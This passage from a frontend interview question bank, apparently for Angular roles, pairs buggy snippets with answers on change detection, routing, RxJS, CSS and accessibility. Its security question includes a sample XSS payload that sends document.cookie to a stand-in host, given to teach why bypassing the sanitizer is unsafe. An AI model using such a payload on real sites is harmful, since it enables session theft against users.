- **Follow-up:** "how do you do an exhaustiveness check?" → `default: const _exhaustive: never = value;`.

---

## 10. Performance

### P10.1 ⭐ — Calling a function from the template
```typescript
@Component({
  template: `
    <p>Total: {{ getTotal() }}</p>
    @for (i of items; track i.id) { <span>{{ format(i) }}</span> }
  `,
})
class CartComponent {
  getTotal() { return this.items.reduce((s, i) => s + i.price * i.qty, 0); }
  format(i: Item) { return `${i.title} — ${i.price}`; }
}
```
> "With `Default` CD and a mouse moving over the page, how many times does `getTotal()` run?"
- **Answer:** on **every CD pass** — dozens of times per second (and twice that in dev). `format` is that multiplied by the number of items.
- **Fix:** `computed()`, or a **pure pipe**, or compute on data change instead of on render.
- **🚩:** "but it's a cheap function" — that's exactly how `filter` + `sort` over 5,000 items ends up running in a template in production.

### P10.2 ⭐⭐ — `track $index`
```typescript
@Component({
  template: `
    @for (row of rows(); track $index) {
      <app-row [row]="row" />
    }
  `,
})
class TableComponent {
  rows = signal<Row[]>([]);
  prepend(r: Row) { this.rows.update(list => [r, ...list]); }
}
```
> "We prepend one item. What goes wrong in the DOM, and what does the user see?"
- **Answer:** with `track $index` Angular concludes that **every row's content changed** (indices shifted) rather than that one item was inserted. Consequences: the whole list is re-created instead of one insertion; **state is lost** — input focus, expanded rows, scroll position; on large lists it's a visible freeze.
- **Fix:** `track row.id`. `$index` is only defensible for primitives with no identity and no mid-list insertions.
- **Follow-up:** "why is `track` mandatory in `@for`?" → because the default reference-based behaviour was the single most common cause of slow lists.

---

## 11. Web platform

### P11.1 ⭐ — Web Worker
```typescript
const worker = new Worker(new URL('./heavy.worker', import.meta.url));

worker.postMessage({
  root: document.querySelector('#app'),
  transform: (x: number) => x * 2,
});
```
> "What happens?"
- **Answer:** **`DataCloneError`**. `postMessage` serializes via **structured clone**, which handles neither DOM nodes, nor functions, nor class instances with methods, nor `Symbol`. On top of that, the DOM is **fundamentally** unavailable inside a worker.
- **Do this instead:** pass **data** (plain objects, `ArrayBuffer` as a transferable) and send the result back to the main thread, which touches the DOM.

### P11.2 ⭐⭐ — `ResizeObserver` loop
```typescript
const ro = new ResizeObserver(() => {
  this.box.nativeElement.style.height = this.box.nativeElement.offsetWidth + 'px';
});
ro.observe(this.box.nativeElement);
```
> "What shows up in the console?"
- **Answer:** `ResizeObserver loop completed with undelivered notifications` — the callback **resizes the observed element itself**, which schedules another callback. The browser breaks the loop and warns; visually you get flicker.
- **Fix:** resize a **different** element; or do it in CSS (`aspect-ratio: 1`) with no JS at all.

### P11.3 ⭐⭐ — An `IntersectionObserver` that never fires
```typescript
const io = new IntersectionObserver(entries => {
  if (entries[0].isIntersecting) this.loadMore();
}, { threshold: 1 });

io.observe(this.sentinel.nativeElement);
```
> "Works on desktop, never fires on mobile. What's wrong?"
- **Answer:** `threshold: 1` means "the element is **100% visible**". If the observed element is **taller than the viewport** (and on mobile the viewport is small), that condition is **never** satisfied.
- **Fix:** `threshold: 0` with a short sentinel (`height: 1px`), or `rootMargin: '200px'` to prefetch.
- **Follow-up:** "what backs `@defer (on viewport)`?" → exactly `IntersectionObserver`.

---

## 12. Testing

### P12.1 ⭐ — `fakeAsync` without `tick`
```typescript
it('debounces search', fakeAsync(() => {
  component.search('an');
  expect(service.query).toHaveBeenCalledWith('an');
}));
```
> "There's a `debounceTime(300)` inside. Two ways this test fails."
- **Answer:** (1) the `expect` fires — the spy hasn't been called, because virtual time never advanced: you need `tick(300)`. (2) Even with the assertion moved later, leaving `fakeAsync` throws **`Error: 1 timer(s) still in the queue`** unless you drain it (`tick`/`flush`/`discardPeriodicTasks`).
- **Trap:** `await fixture.whenStable()` **inside** `fakeAsync` doesn't work. Pick **either** `fakeAsync` + `tick` **or** `async/await` + `whenStable`.
- **Follow-up:** "what do you use for RxJS timing?" → `TestScheduler.run()` with marble diagrams.

### P12.2 ⭐⭐ — OnPush in a test
```typescript
it('renders items', () => {
  const fixture = TestBed.createComponent(HostComponent);
  const list = fixture.debugElement.query(By.directive(ListComponent));

  list.componentInstance.items.push({ id: 2, name: 'B' });
  fixture.detectChanges();

  expect(fixture.nativeElement.textContent).toContain('B');
});
```
> "`ListComponent` is `OnPush`. The test is red. Why, and what's the correct fix?"
- **Answer:** the test reached into the child's **instance** and **mutated** the array. `fixture.detectChanges()` checks the host, and the `OnPush` child is **not marked dirty** → its view isn't checked.
- **Correct:** `fixture.componentRef.setInput('items', [...])` on the host, or drive the state through the host component.
- **Lesson:** if a test is "cured" by an extra `detectChanges()`, you're testing something other than what the framework actually does.

---

## 13. Security

### P13.1 ⭐ — Sanitization
```typescript
@Component({ template: `<div [innerHTML]="rendered"></div>` })
class CommentComponent {
  @Input() comment!: { body: string };

  get rendered() {
    return this.sanitizer.bypassSecurityTrustHtml(this.comment.body);
  }
}
```
> "What's wrong here, and what would happen without the bypass?"
- **Answer:** `bypassSecurityTrustHtml` on **user input** is an open XSS hole. A comment containing `<img src=x onerror="fetch('//evil/'+document.cookie)">` executes.
- **Without the bypass:** Angular sanitizes the binding per context — strips `onerror`, `<script>`, `javascript:`. That's why the default is right and `bypass*` is a deliberate exception.
- **Bonus:** the getter also mints a new `SafeHtml` on every CD (see P2.4).
- **Follow-up:** "does a `<script>` inside `innerHTML` execute?" → no — which is exactly why attacks go through `onerror`/`onload`.

### P13.2 ⭐⭐ — How many requests?
```typescript
this.http.get('https://api.partner.com/orders', {
  headers: { 'X-Trace-Id': traceId },
  withCredentials: true,
});
```
> "How many requests does the Network tab show, and what must the server return?"
- **Answer:** **two** — first an `OPTIONS` **preflight**, because the custom header makes the request non-simple, then the actual `GET`.
- **The server must return:** `Access-Control-Allow-Origin: https://my-domain` (**not `*`**, because of `withCredentials`), `Access-Control-Allow-Credentials: true`, `Access-Control-Allow-Headers: X-Trace-Id`; ideally `Access-Control-Max-Age`.
- **🚩:** "we need to configure something in Angular" — CORS is **not configured on the front end**.
- **Follow-up:** "will Angular's XSRF token be attached here?" → no: the built-in interceptor only adds the header for **relative/same-origin** URLs, and not for GET.

---

## 14. Architecture & view abstractions

### P14.1 ⭐ — `@ViewChild` and timing
```typescript
@Component({ template: `@if (ready) { <input #field /> }` })
class FormComponent implements OnInit, AfterViewInit {
  ready = true;
  @ViewChild('field') field!: ElementRef<HTMLInputElement>;

  ngOnInit() { this.field.nativeElement.focus(); }
  ngAfterViewInit() { this.field.nativeElement.focus(); }
}
```
> "Which of the two calls throws, and does `{ static: true }` save it?"
- **Answer:** **`ngOnInit`** throws — it's `undefined`, because static queries resolve before the first CD and non-static ones (the default) by `ngAfterViewInit`. `{ static: true }` **doesn't help**: the element sits inside an `@if`, so it may not exist at init time at all.
- **Correct:** do the work in `ngAfterViewInit`, or use signal queries (`viewChild()`), or `afterNextRender`.

### P14.2 ⭐⭐ — Direct DOM access and SSR
```typescript
ngOnInit() {
  document.body.classList.add('modal-open');
  this.el.nativeElement.querySelector('.overlay').style.display = 'block';
}
```
> "The app uses SSR. What happens, and how do you rewrite it?"
- **Answer:** on the server `document` **doesn't exist** → `ReferenceError`, and the page render dies. Even if it didn't, the server-built DOM and client hydration would diverge.
- **Correct:** `Renderer2` (`setStyle`/`addClass`); or `afterNextRender()` / `isPlatformBrowser()`; and find `.overlay` via `@ViewChild`.
- **✅✅:** names two more arguments against `nativeElement`: it bypasses sanitization (XSS) and hard-couples the code to a browser.

### P14.3 ⭐⭐ — Where does the view land?
```typescript
@Component({
  template: `
    <ng-template #tpl><b>hello</b></ng-template>
    <div #host class="host"></div>
  `,
})
class DynamicComponent implements AfterViewInit {
  @ViewChild('tpl') tpl!: TemplateRef<unknown>;
  @ViewChild('host', { read: ViewContainerRef }) vcr!: ViewContainerRef;

  ngAfterViewInit() {
    this.vcr.createEmbeddedView(this.tpl);
  }
}
```
> "Does `<b>hello</b>` end up **inside** `div.host`, or somewhere else?"
- **Answer:** **not inside** — as a **sibling immediately after** `div.host`. A `ViewContainerRef` read from an element uses that element as an **anchor** and inserts views **after** it.
- **Trap #2:** creating a view in `ngAfterViewInit` can easily produce `ExpressionChangedAfterItHasBeenCheckedError`.
- **Follow-up:** "so how do you get it inside?" → take the `ViewContainerRef` of a component/directive placed **inside** the container, or just use `ngTemplateOutlet`.
- **Role breakdown:** `TemplateRef` is the blueprint, `ViewContainerRef` is the insertion point, `ViewRef` is the handle to the created view (and it *is* a `ChangeDetectorRef`).

---

## 15. Routing

### P15.1 ⭐ — The component isn't re-created
```typescript
export class UserComponent implements OnInit {
  ngOnInit() {
    const id = this.route.snapshot.paramMap.get('id');
    this.user$ = this.api.getUser(id!);
  }
}
```
> "From `/user/1` we click a link to `/user/2`. What's on screen?"
- **Answer:** **user 1's data**. Navigating within the **same** route makes the router **reuse the component instance** — `ngOnInit` doesn't run again and the `snapshot` stays stale.
- **Fixes:** subscribe to `route.paramMap` (`switchMap` into the API); or `withComponentInputBinding()` + `id = input.required<string>()`; or `runGuardsAndResolvers: 'paramsChange'`.
- **Follow-up:** "when do you actually *want* the component re-created?" → `RouteReuseStrategy` — but first ask whether making the component reactive isn't simpler.

### P15.2 ⭐⭐ — A guard that hangs navigation
```typescript
export const authGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  return auth.user$.pipe(map(user => !!user));
};

// AuthService
readonly user$ = new BehaviorSubject<User | null>(null);
```
> "The user is logged in, the guard returns `true` — and navigation just hangs. Why?"
- **Answer:** the router takes the **first value and waits for `complete`**. A `BehaviorSubject` **never completes** → navigation is stuck in `GuardsCheckStart` **forever**: the URL doesn't change and there's no console error.
- **Fix:** `take(1)` / `first()`.
- **Why `HttpClient` doesn't have this problem:** it completes on its own.
- **Follow-up:** "how do you redirect from a guard?" → return a **`UrlTree`** rather than calling `router.navigate()` inside the guard.

### P15.3 ⭐⭐ — `CanActivate` where you need `CanMatch`
```typescript
const routes: Routes = [
  { path: 'dashboard', component: AdminDashboardComponent, canActivate: [adminGuard] },
  { path: 'dashboard', component: UserDashboardComponent },
];
```
> "The intent: admins get the admin dashboard, regular users get theirs. Does it work?"
- **Answer: no.** `CanActivate` runs **after** the route has already been **matched**. For a non-admin the guard returns `false` → navigation is **cancelled** (`NavigationCancel`), and the second route is **never considered**.
- **Fix:** `canMatch: [adminGuard]` — it runs during the **matching phase**: `false` means "this route doesn't apply", and the router moves on.
- **Bonus:** `canMatch` also **gates lazy loading** — the admin chunk never ships to an unauthorized user.

---

## 16. Multicasting

### P16.1 ⭐ — `shareReplay`: leak and buffer
```typescript
readonly config$ = this.http.get('/api/config').pipe(shareReplay());
readonly ticks$ = interval(100).pipe(shareReplay());
```
> "Both lines share one defect, and the second has an extra one. Which?"
- **Answer:**
  - **The shared defect — no `refCount`:** `shareReplay()` without `{ refCount: true }` keeps the source subscription alive **even after every consumer has unsubscribed**. For HTTP that's a "forever" cache that never refreshes; for `interval` it's a timer ticking for the lifetime of the tab.
  - **The second defect, in `ticks$` — an unbounded buffer:** without `bufferSize` the **entire history** is replayed → 10 values per second accumulate in memory forever.
- **Fix:** `shareReplay({ bufferSize: 1, refCount: true })`; and if you don't need history at all — `share()`.

### P16.2 ⭐⭐ — The late subscriber
```typescript
const clock$ = interval(1000).pipe(share());

const a = clock$.subscribe(v => console.log('A', v));
setTimeout(() => clock$.subscribe(v => console.log('B', v)), 3500);
setTimeout(() => a.unsubscribe(), 6000);
```
> "Which value does `B` start from? And what happens at the 6-second mark?"
- **Answer:** `B` sees **3** (the first value after it subscribes) — `share()` **doesn't replay**. At 6s `A` unsubscribes, but the ref count is **not zero** (`B` is still there) → the source stays alive and `B` keeps counting from the same `interval`, **no restart**.
- **Follow-up:** "and if `B` weren't there?" → ref count drops to 0 → `interval` stops; the next subscriber would start a **brand-new** one from zero.

### P16.3 ⭐⭐ — `share()` on a synchronous source
```typescript
const source$ = defer(() => {
  console.log('produce');
  return of(1, 2, 3);
}).pipe(share());

source$.subscribe(v => console.log('A', v));
source$.subscribe(v => console.log('B', v));
```
> "How many times does `produce` print?"
- **Answer: twice.** The source is **synchronous**: by the time the second `subscribe` runs it has already emitted everything and **completed**, and `share()` defaults to `resetOnComplete: true` → it resets and re-runs the producer. Multicasting can't help when there's nothing left to share.
- **Options:**
  - `share({ resetOnComplete: false })` → `produce` **once**, but `B` receives only `complete`, **no values**.
  - `shareReplay({ bufferSize: 3, refCount: false })` → one `produce`, and `B` gets `1, 2, 3` replayed.
  - `connectable(source$, ...)` + `.connect()` **after** both subscriptions → everyone gets everything, one producer run. This is precisely the race `connectable` exists to solve.
- **🚩:** "`share` always means one request" — with no grasp of the reset policies.

---

## 17. The `this` keyword

### P17.1 ⭐ — Losing `this` in a subscription
```typescript
export class FeedComponent implements OnInit {
  items: string[] = [];

  ngOnInit() {
    this.socket.messages$.subscribe(this.handle);
  }

  handle(msg: string) {
    this.items.push(msg);
  }
}
```
> "The first message throws `Cannot read properties of undefined (reading 'items')`. Why, and give me three fixes."
- **Answer:** the method is **detached** from the object — `subscribe` receives a bare function, and at call time `this` falls back to the **default binding**; class bodies are always strict → `undefined`.
- **Fixes:** (1) an arrow wrapper, `subscribe(m => this.handle(m))`; (2) `subscribe(this.handle.bind(this))`; (3) an arrow class field, `handle = (msg: string) => {...}`.
- **Trade-off for (3):** the function lives **on every instance** rather than the prototype — slightly more memory, harder to mock in tests.
- **Follow-up:** "so why does `(click)="handle($event)"` work in a template?" → Angular calls the method **on the instance** (implicit binding); nothing is detached.

### P17.2 ⭐ — A nested regular function
```typescript
process() {
  this.items.forEach(function (item) {
    this.transform(item);
  });
}
```
> "What happens, and give me two fixes that don't use an arrow function."
- **Answer:** `TypeError` — a nested **regular** function has its **own** `this` (default → `undefined` in strict mode).
- **Fixes without an arrow:** the second argument to `forEach(fn, this)` (`thisArg`), or `.bind(this)`.

### P17.3 ⭐⭐ — Four ways to lose implicit binding
```typescript
class ApiService {
  base = '/api';
  url(path: string) { return this.base + path; }
}

const api = new ApiService();
const { url } = api;
const ref = api.url;

console.log(api.url('/users'));
console.log(ref('/users'));
console.log(url?.('/users'));
console.log(['/users'].map(api.url)[0]);
console.log(['/users'].map(api.url, api)[0]);
```
> "What does each line print?"
- **Answer:** `'/api/users'`, then **three `TypeError`s**, then `'/api/users'` again.
- **Mechanics:** `this` is determined by the **call site**, not the declaration site. Implicit binding (`obj.fn()`) only applies when the call goes **through the dot**. Destructuring, assigning to a variable, `?.()` on a bare variable, and passing the method as a callback all **detach** the function from the object.
- **Last line:** `map(fn, thisArg)` — the second argument sets `this` explicitly, so it works.
- **Trap:** `url?.()` — optional call **doesn't rescue `this`**; it only guards against the function not existing.
- **Follow-up:** "what if `url` were an arrow field?" → all five lines would return `'/api/users'`, because `this` is captured lexically on the instance.

### P17.4 ⭐⭐ — A `removeEventListener` that removes nothing
```typescript
ngOnInit() {
  window.addEventListener('resize', this.onResize.bind(this));
}

ngOnDestroy() {
  window.removeEventListener('resize', this.onResize.bind(this));
}
```
> "Why isn't the listener removed?"
- **Answer:** every `bind` returns a **new function**. `removeEventListener` compares by **reference**, and we're handing it a different function than we registered. The listener lives on, holding the component in memory → a **leak** (20 route changes later you have 20 live components).
- **Fixes:** store the reference in a field; use an arrow field; use an `AbortController` (`addEventListener(..., { signal })` + `abort()`); or `fromEvent()` + `takeUntilDestroyed()`.

### P17.5 ⭐⭐ — `bind` + `new`, and double `bind`
```javascript
function Greeter(name) {
  this.name = name;
}

const Bound = Greeter.bind({ name: 'context' });
const g = new Bound('Ann');
console.log(g.name);

function who() { return this.tag; }
const twice = who.bind({ tag: 'first' }).bind({ tag: 'second' });
console.log(twice());
```
> "What does each `console.log` print?"
- **Answer:** `Ann`, then `first`.
- **Mechanics:** binding priority is **`new` > explicit (`bind`/`call`) > implicit (`obj.fn()`) > default**. `new` creates a fresh object and **ignores** the bound `this` (bound **arguments** survive — that's partial application). The second `bind` **doesn't override** the first: it binds an already-bound wrapper whose internal `this` is fixed forever.
- **Follow-up:** "and `bind` on an arrow function?" → syntactically allowed, **zero effect**: an arrow has no own `this` to rebind.

---

## 18. Resource hints

### P18.1 ⭐⭐ — `<head>` review
```html
<head>
  <link rel="preload" href="/fonts/inter.woff2">
  <link rel="prefetch" href="/styles/critical.css">
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link rel="prerender" href="/checkout">
</head>
```
> "Four lines, four mistakes. Find them."
- **Answer:**
  1. **`preload` without `as`** → the browser knows neither the priority nor the type; the console will say "was preloaded but not used". For a font you also **must** add **`crossorigin`** (fonts are fetched in anonymous CORS mode), otherwise the file **downloads twice**. Correct: `as="font" type="font/woff2" crossorigin`.
  2. **`prefetch` for the current page's critical CSS** → `prefetch` is **low** priority, "later, when idle". Critical CSS belongs in a plain `<link rel="stylesheet">` or a `preload`.
  3. **`preconnect` to `fonts.gstatic.com` without `crossorigin`** → a connection opens, but **the wrong one**: fonts go over CORS, so a separate handshake is still needed.
  4. **`rel="prerender"` is effectively dead** → the modern replacement is the **Speculation Rules API**.
- **Follow-up:** "how many `preconnect`s are reasonable?" → a handful, critical origins only. Use `dns-prefetch` for the rest.
- **Angular tie-in:** "future screens" are prepared by the **router** — `withPreloading(...)` — not by hand-written `prefetch` links.

---

## 19. New HTML & CSS features

### P19.1 ⭐ — `100vh` on mobile
```css
.hero {
  height: 100vh;
}
```
> "On iPhone the bottom button hides behind the address bar. Why, and what replaces this?"
- **Answer:** `vh` is measured against the **large** viewport (address bar **hidden**), but on load the bar is visible → the actual visible height is smaller than `100vh`.
- **Fix:** `100dvh` (dynamic) or `100svh` (small — guaranteed to fit). `lvh` is what `vh` used to do.
- **Follow-up:** "downside of `dvh`?" → the value changes while scrolling, so the layout can "breathe"; for stability use `svh`.

### P19.2 ⭐⭐ — Exit animation
```css
.toast {
  display: block;
  opacity: 1;
  transition: opacity 0.3s, display 0.3s;
}
.toast.hidden {
  display: none;
  opacity: 0;
}
```
> "Appearing and disappearing are instant, no fade. Why, and how do you fix it natively?"
- **Answer:** `display` is a **discrete** property: by default it flips instantly, so the element is gone before `opacity` can animate. And for the **entry** there's nothing to transition *from* — it's the element's first render.
- **Fix:**
  ```css
  .toast { transition: opacity .3s, display .3s allow-discrete; }
  @starting-style { .toast { opacity: 0; } }
  ```
- **Bonus:** for `popover`/`<dialog>` you also need `overlay` in the transition list.

### P19.3 ⭐⭐ — A container query that doesn't work
```css
.card {
  container-type: inline-size;
  display: block;
}

@container (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 1fr 1fr;
  }
}
```
> "Nothing applies. Why?"
- **Answer:** an element **cannot respond to its own** container query. `@container` looks at the nearest **ancestor** container, and `.card` is the container itself.
- **Fix:** make a **wrapper** the container and style `.card` inside it:
  ```css
  .card-wrapper { container-type: inline-size; }
  @container (min-width: 400px) { .card { grid-template-columns: 1fr 1fr; } }
  ```
- **Bonus:** `container-type: inline-size` enables **containment** — the contents can no longer influence the container's inline size. That's the price of the feature.

### P19.4 ⭐⭐ — Specificity of `:is` / `:where` / `:has`
```css
:where(#app) .btn { color: red; }
:is(#app) .btn { color: blue; }
.card:has(.badge) .btn { color: green; }
```
> "Markup: `#app > .card.has-badge > .badge + .btn`, so all three rules match. Which colour wins? Compute each specificity."
- **Answer: blue.**
  - `:where(#app) .btn` → `:where()` always contributes **zero** → `(0,0,1,0)`.
  - `:is(#app) .btn` → `:is()` takes the specificity of its **most specific argument** → `(0,1,1,0)`.
  - `.card:has(.badge) .btn` → `:has()` likewise → three classes → `(0,0,3,0)`.
  - Comparison is **column by column, left to right**: one id beats any number of classes.
- **Trap:** answering **green** — "three selectors, so it must be the most specific". Specificity isn't summed into one number, and columns don't carry.

---

## 20. HTML & CSS mechanics

### P20.1 ⭐ — Sticky that doesn't stick
```css
.wrapper { overflow-x: hidden; }
.wrapper .header { position: sticky; top: 0; }
```
> "`sticky` doesn't work. Why specifically because of `overflow-x: hidden`?"
- **Answer:** any `overflow` other than `visible` turns the element into a **scroll container**. Sticky now sticks **within `.wrapper`** rather than to the viewport — and `.wrapper` doesn't scroll vertically.
- **Fixes:** `overflow-x: clip` — clips **without** creating a scroll container; or remove the overflow from the ancestor.
- **Other reasons it "doesn't stick":** none of `top/right/bottom/left` is set; the parent is exactly as tall as the content; the parent is `display: flex` with the default `align-items: stretch`.

### P20.2 ⭐ — `@layer` vs specificity
```css
@layer base, theme;

@layer base {
  #app .btn { color: red; }
}

@layer theme {
  .btn { color: blue; }
}

.btn { color: green; }
```
> "Which colour wins?"
- **Answer:** **green**. The order is: **unlayered styles beat any layer**; among layers, the one declared **later** wins (`theme` > `base`) — **regardless of specificity**.
- **Why this is valuable:** `@layer` gives predictable cascade control instead of an `!important` arms race. A typical setup: `@layer reset, vendor, base, components, utilities`.

### P20.3 ⭐⭐ — Margin collapsing
```html
<div class="parent">
  <p>Text</p>
</div>
```
```css
.parent { background: #eee; }
p { margin: 40px 0; }
```
> "Why does the grey background have no top/bottom spacing, and the empty space instead sits **above** the parent?"
- **Answer:** **margin collapsing** between the parent and its first/last child: there's no `border`, `padding`, or BFC between them, so the child's margin "escapes" and becomes the parent's margin.
- **Fixes (cleanest first):** `.parent { display: flow-root; }`; or `padding`/`border`; or `overflow: hidden` (a hack with clipping as a side effect); or switch to `display: flex/grid` + `gap`, where collapsing **doesn't happen at all**.
- **Follow-up:** "do horizontal margins collapse?" → no, only along the block axis and only in normal flow.

### P20.4 ⭐⭐ — The flex item that refuses to shrink
```css
.row { display: flex; }
.title {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
```
> "A long title doesn't get an ellipsis — it blows out the whole row. Why?"
- **Answer:** a flex item's `min-width` defaults to **`auto`**, i.e. "never smaller than my min-content". A long `nowrap` string has a wide min-content → the item refuses to shrink.
- **Fix:** `.title { min-width: 0; }` (in a column direction, `min-height: 0`).
- **Follow-up:** "same in grid?" → yes, grid items have the same behaviour (it typically breaks scrolling inside a grid cell).

### P20.5 ⭐⭐ — `transform` breaks `fixed`
```css
.page { transform: translateZ(0); }
.modal { position: fixed; inset: 0; }
```
> "The modal no longer covers the screen and scrolls with the page. Why?"
- **Answer:** any `transform` (and `filter`, `perspective`, `will-change: transform`, `contain: paint`, `backdrop-filter`) on an ancestor makes it the **containing block** for `position: fixed` descendants. The modal is now positioned relative to `.page` — effectively `absolute`.
- **Where it bites:** `translateZ(0)` "for GPU acceleration", page transition animations, wrappers with `will-change`.
- **Fix:** remove the transform from the ancestor, or move the modal into the top layer / portal it into `body`.

### P20.6 ⭐⭐ — Stacking context
```css
.header { position: relative; z-index: 1; }
.header .dropdown { position: absolute; z-index: 9999; }
.content { position: relative; z-index: 2; }
```
> "The dropdown hides behind the content despite `z-index: 9999`. Why, and how do you fix it?"
- **Answer:** `.header` with `position` + `z-index: 1` **creates a stacking context**. All its descendants are sealed inside it — their `z-index` is only compared **against each other**. At the top level `.header` (1) competes with `.content` (2), so the entire header, dropdown included, goes underneath.
- **Fixes:** drop the `z-index` on `.header`; move the dropdown into the **top layer** — `popover` / `<dialog>`; or, at worst, portal into `body` via CDK Overlay.
- **Follow-up:** "what else creates a stacking context?" → `opacity < 1`, `transform`, `filter`, `will-change`, `isolation: isolate`, `contain: paint`.

---

## 21. HTML semantics & a11y

### P21.1 ⭐ — The button that submits the form
```html
<form (ngSubmit)="save()">
  <input formControlName="email" />
  <button (click)="resetForm()">Reset</button>
  <button type="submit">Save</button>
</form>
```
> "We click Reset. What happens?"
- **Answer:** the form **submits**. A `<button>` with no `type` attribute defaults to **`type="submit"`**, so the click fires both `resetForm()` and `ngSubmit` → `save()`.
- **Fix:** `<button type="button">`. Rule: inside a form, **always** write `type` explicitly.
- **Follow-up:** "what about `<input>` + Enter?" → in a form with a single text field, Enter triggers implicit submission too.

### P21.2 ⭐ — A label bound to nothing
```html
<label>Email</label>
<input type="text" placeholder="Email" />
```
> "Three accessibility problems."
- **Answer:**
  1. The `<label>` is **not associated** with the input (no `for="id"`, no wrapping) → the screen reader announces the field **with no name**, and clicking the label doesn't focus it.
  2. **`placeholder` is not a label substitute**: it disappears on input and has poor contrast.
  3. **`type="text"` for an email** → wrong mobile keyboard, no native validation, worse `autocomplete`.
- **Correct:** `<label for="email">Email</label><input id="email" type="email" autocomplete="email">`.

### P21.3 ⭐⭐ — A `<div>` instead of a button
```html
<div class="btn" (click)="submit()">Submit</div>
```
> "List everything that's broken here for keyboard and screen-reader users."
- **Answer:** no **focusability** (needs `tabindex="0"`); no **keyboard activation** (Enter/Space — needs a `keydown` handler); no **role** (needs `role="button"`); no `disabled` state; no `:focus-visible`; inside a form, no submit behaviour.
- **Correct:** `<button type="button" (click)="submit()">` — all of the above comes for free.
- **🚩:** "I'll add `role="button"` and `cursor: pointer`" — half the problems remain; the textbook illustration of **"No ARIA > bad ARIA"**.

### P21.4 ⭐⭐ — `aria-hidden` on something focusable
```html
<button class="close" aria-hidden="true" (click)="close()">✕</button>

<section>
  <h4>Settings</h4>
  <h2>Profile</h2>
</section>
```
> "Two separate problems. Which?"
- **Answer:**
  1. **`aria-hidden="true"` on a focusable element** — the worst combination: the button **stays in the tab order** but **doesn't exist** for a screen reader → the user tabs into a void. If you truly want it hidden from AT, remove it from focus too (`inert`); but here you want the opposite: give it an accessible name (`aria-label="Close"`), because `✕` means nothing.
  2. **Broken heading hierarchy** — `h4` before `h2`: the level is determined by **document structure**, not font size. Size is CSS's job.

---

## 22. Execution context, scope & closures

> A section beyond the theory bank. It doesn't test "can you define a closure" — it tests whether the candidate sees **where the lexical environment is actually created**, because that's where the quietest bugs live.

### P22.1 ⭐ — `var` in a loop
```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log('var', i), 0);
}

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log('let', j), 0);
}
```
> "What does each loop print?"
- **Answer:** `var 3, var 3, var 3`, then `let 0, let 1, let 2`.
- **Mechanics:** `var` is **function-scoped** — there is **one** `i` for the entire loop, and all three callbacks close over **the same** binding. By the time `setTimeout` fires, the loop is long done and `i === 3`. `let` creates **a fresh binding per iteration**, so each callback sees its own copy.
- **Fix for `var` (the pre-arrow classic):** an IIFE, `(function (i) { setTimeout(...) })(i)` — manufacture a scope; or `setTimeout(fn, 0, i)` — pass the value as an argument.
- **Follow-up:** "if the loop body reassigns the `let` variable, does that carry into the next iteration?" → no, the binding is per-iteration; the value is copied at the start of each one.

### P22.2 ⭐ — Hoisting and the TDZ
```javascript
console.log(a);
console.log(f());
console.log(g());
console.log(b);

var a = 1;
let b = 2;
function f() { return 'f'; }
var g = function () { return 'g'; };
```
> "What does each line print? Where exactly does execution stop?"
- **Answer:**
  - `console.log(a)` → **`undefined`**: `var` is hoisted and initialized to `undefined` before execution.
  - `console.log(f())` → **`'f'`**: a **function declaration** is hoisted whole, body included.
  - `console.log(g())` → **`TypeError: g is not a function`**: only `var g` was hoisted, holding `undefined`; the assignment hasn't happened yet.
  - Execution **never reaches** `console.log(b)` — it already threw on the previous line. If it did reach it: **`ReferenceError: Cannot access 'b' before initialization`** (the **TDZ**: `let`/`const` are hoisted too, but stay uninitialized until their declaration line).
- **Key distinction:** "`let` isn't hoisted" is imprecise. It *is* hoisted, but into the **TDZ** — which is why the error says *before initialization*, not *is not defined*.
- **Follow-up:** "and classes?" → same as `let`: in the TDZ, so `new Foo()` before the declaration is a `ReferenceError`.

### P22.3 ⭐⭐ — A closure created in the wrong place
```typescript
function debounce(fn: () => void, ms: number) {
  let timer: ReturnType<typeof setTimeout>;
  return () => {
    clearTimeout(timer);
    timer = setTimeout(fn, ms);
  };
}

export class SearchComponent {
  onInput(value: string) {
    debounce(() => this.search(value), 300)();
  }
}
```
> "`(input)="onInput($event.target.value)"`. The user types 'angular' — 7 characters. How many requests hit the server?"
- **Answer: seven.** The debounce **does nothing at all**. `debounce(...)` is called **on every keystroke** and each call creates a **fresh lexical environment** with its own `timer` — so `clearTimeout(timer)` always clears a brand-new `undefined` and cancels **nothing**. 300 ms after each character, a request goes out.
- **The point:** the whole value of a debounce is state that **outlives** the calls. The closure must be created **once**:
  ```typescript
  export class SearchComponent {
    onInput = debounce((value: string) => this.search(value), 300);
  }
  ```
- **The Angular way:** a `Subject` + `debounceTime(300)`, or `toSignal(... debounceTime ...)` — there the state lives in the stream, not in a closure.
- **🚩:** "but I *am* calling `debounce`, so debouncing happens" — confuses **calling the factory** with **using the function it returns**.

### P22.4 ⭐⭐ — A closure holding memory
```typescript
function setup(el: HTMLElement) {
  const huge = new Array(1_000_000).fill('x');

  const onClick = () => console.log('clicked');
  const debug = () => console.log(huge.length);

  el.addEventListener('click', onClick);
  return debug;
}

const debugFn = setup(button);
```
> "`onClick` doesn't use `huge`. Will that megabyte array be freed once `setup` returns?"
- **Answer: no.** And this is the least obvious part of closures.
- **Mechanics:** the engine (V8) allocates **one context object per scope**, shared by **all** closures created in it. Since `debug` references `huge`, that variable is context-allocated — and `onClick`, sitting in an event listener, keeps **the same** context alive. As a result `huge` is never collected while the listener lives, even though `onClick` "knows nothing" about it.
- **How to fix:** remove `debug` (or move it into its own scope); or explicitly `huge = null` after use; or don't keep heavy data in the same scope where long-lived callbacks are created.
- **How to see it:** Memory profiler → heap snapshot → look for `(closure)` in retainers; detached DOM nodes.
- **Why this is senior+:** typical diagnosis stops at "the listener wasn't removed". Here the listener may be **removed correctly** and memory still leaks — through a sibling closure in the same scope.

---

## 23. Type coercion & equality

> A section beyond the theory bank. The goal isn't memorizing tables but understanding **two mechanisms**: ToPrimitive/ToNumber, and the special rules of `==`. A candidate who says "I just write `===` everywhere" has the right **practice** — but the question is whether they know **what** they're defending against.

### P23.1 ⭐ — The `+` and `-` operators
```javascript
console.log('5' - 3);
console.log('5' + 3);
console.log(5 + null);
console.log(5 + undefined);
console.log('5' * '2');
console.log([] + []);
console.log([] + {});
console.log(1 + '1' - 1);
```
